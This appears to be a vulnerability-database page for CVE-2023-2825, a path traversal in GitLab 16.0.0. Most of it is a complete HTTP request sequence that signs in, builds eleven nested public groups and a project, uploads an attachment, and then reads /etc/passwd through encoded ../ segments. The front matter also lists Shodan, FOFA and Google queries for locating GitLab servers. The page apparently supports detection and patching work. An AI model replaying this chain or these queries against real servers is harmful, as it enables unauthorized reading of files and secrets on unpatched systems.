---
layout: "post"
cve_id: "CVE-2023-2825"
title: "GitLab 16.0.0 - Path Traversal"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-2825.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-2825.yaml"
author: "DhiyaneshDk,rootxharsh,iamnoooob,pdresearch"
severity: "high"
remediation: "Upgrade GitLab to a version that is not affected by the path traversal vulnerability (CVE-2023-2825).
"
reference:
  - "https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/"
  - "https://github.com/Occamsec/CVE-2023-2825"
  - "https://labs.watchtowr.com/gitlab-arbitrary-file-read-gitlab-cve-2023-2825-analysis/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-2825"
  - "https://gitlab.com/gitlab-org/cves/-/blob/master/2023/CVE-2023-2825.json"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
  cvss-score: 7.5
  cve-id: "CVE-2023-2825"
  cwe-id: "CWE-22"
  epss-score: 0.93022
  epss-percentile: 0.99766
  cpe: "cpe:2.3:a:gitlab:gitlab:16.0.0:*:*:*:community:*:*:*"
metadata:
  verified: True
  max-request: 16
  vendor: "gitlab"
  product: "gitlab"
  shodan-query: ['title:"Gitlab"', 'cpe:"cpe:2.3:a:gitlab:gitlab"', 'http.title:"gitlab"']
  fofa-query: "title=\"gitlab\""
  google-query: "intitle:\"gitlab\""
tags:
  - "cve2023"
  - "cve"
  - "gitlab"
  - "lfi"
  - "authenticated"
  - "intrusive"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
An issue has been discovered in GitLab CE/EE affecting only version 16.0.0. An unauthenticated malicious user can use a path traversal vulnerability to read arbitrary files on the server when an attachment exists in a public project nested within at least five groups


## üåê HTTP Request
```nohighlight
GET /users/sign_in HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /users/sign_in HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 76
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

user%5Blogin%5D=EDPchA&user%5Bpassword%5D=281F1yNB&authenticity_token=CIQ6Ml
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 126
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=&group%5Bname%5D=u1Xod-1&group%5Bpath%5D=u1Xod-1&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-2&group%5Bpath%5D=u1Xod-2&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-3&group%5Bpath%5D=u1Xod-3&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.3
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-4&group%5Bpath%5D=u1Xod-4&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.32 Safari/537.36
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-5&group%5Bpath%5D=u1Xod-5&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-6&group%5Bpath%5D=u1Xod-6&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-7&group%5Bpath%5D=u1Xod-7&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-8&group%5Bpath%5D=u1Xod-8&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 132
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-9&group%5Bpath%5D=u1Xod-9&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
Content-Length: 134
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-10&group%5Bpath%5D=u1Xod-10&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /groups HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.2 Safari/537.36
Connection: close
Content-Length: 134
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

group%5Bparent_id%5D=niXX1M&group%5Bname%5D=u1Xod-11&group%5Bpath%5D=u1Xod-11&group%5Bvisibility_level%5D=20&authenticity_token=52FDXZ
```

```nohighlight
POST /projects HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Connection: close
Content-Length: 262
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

project%5Bci_cd_only%5D=false&project%5Bname%5D=CVE-2023-2825&project%5Bselected_namespace_id%5D=2j76Bp&project%5Bnamespace_id%5D=2j76Bp&project%5Bpath%5D=CVE-2023-2825&project%5Bvisibility_level%5D=20&project%5Binitialize_with_readme=1&authenticity_token=52FDXZ
```

```nohighlight
POST /u1Xod-1/u1Xod-2/u1Xod-3/u1Xod-4/u1Xod-5/u1Xod-6/u1Xod-7/u1Xod-8/u1Xod-9/u1Xod-10/u1Xod-11/CVE-2023-2825/uploads HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15
Connection: close
Content-Length: 190
Accept: */*
Content-Type: multipart/form-data; boundary=0ce2a9fbe06b6da89c138a35a1765ed6
X-CSRF-Token: 0eS2ec
Accept-Encoding: gzip

--0ce2a9fbe06b6da89c138a35a1765ed6
Content-Disposition: form-data; name="file"; filename="36h9PJXki1eUPxrknsFVFKJDkFS"

36h9PJXki1eUPxrknsFVFKJDkFS
--0ce2a9fbe06b6da89c138a35a1765ed6--
```

```nohighlight
GET /u1Xod-1/u1Xod-2/u1Xod-3/u1Xod-4/u1Xod-5/u1Xod-6/u1Xod-7/u1Xod-8/u1Xod-9/u1Xod-10/u1Xod-11/CVE-2023-2825/uploads/X7ySui/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Safari/605.1.15
Connection: close
Accept: */*
Accept-Encoding: gzip
```


